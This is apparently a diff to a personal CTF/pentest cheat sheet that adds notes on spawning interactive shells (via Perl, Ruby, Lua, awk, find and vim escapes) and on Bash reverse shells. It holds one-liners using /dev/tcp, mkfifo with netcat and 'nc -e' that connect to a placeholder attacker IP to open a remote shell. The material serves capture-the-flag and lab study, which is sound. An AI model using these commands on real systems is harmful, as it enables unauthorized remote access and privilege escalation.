@@ -193,9 +193,38 @@ Strings will print human readable chars of a file. And for a CTF if we are looki
 - `lscpu` will tell you if you are 32 or 64
 - `uname -m` similar but less verbose
 
-## Bash Reverse shell
+## Shells
+
+### Spawning interactive shells
+
+- `/bin/sh -i` execute the shell interpreter specified in the path in interactive mode (-i).
+- With Perl
+  - `perl —e 'exec "/bin/sh";'` or from a script `perl: exec "/bin/sh";`
+- With Ruby
+  - `ruby: exec "/bin/sh"` has to be run from a script
+- With Lua
+  - `lua: os.execute('/bin/sh')` has to be run from a script
+- With awk
+  - `awk 'BEGIN {system("/bin/sh")}'`
+- With Find
+  - `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`
+  - `find . -exec /bin/sh \; -quit` This use of the find command uses the execute option (-exec) to initiate the shell interpreter directly. If find can't find the specified file, then no shell will be attained.
+- With vim
+  - `vim -c ':!/bin/sh'`
+  - Vim Escape
+
+```bash
+vim
+:set shell=/bin/sh
+:shell
+```
+
+> Source HTB Academy
+
+### Bash Reverse shell
 
 - Say we have a way through root and we need to get a reverse shell here are helpfuls command
+  - `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc IP-OF-YOUR-KALI 7777 > /tmp/f` serve a Bash shell on a network socket utilizing a Netcat listener.
   - `/bin/bash -i >& /dev/tcp/IP-OF-YOUR-KALI/4444 0>&1`
   - `nc IP-OF-YOUR-KALI 4444 –e /bin/bash`
   - `nc IP-OF-YOUR-KALI 4444 –e /bin/sh`
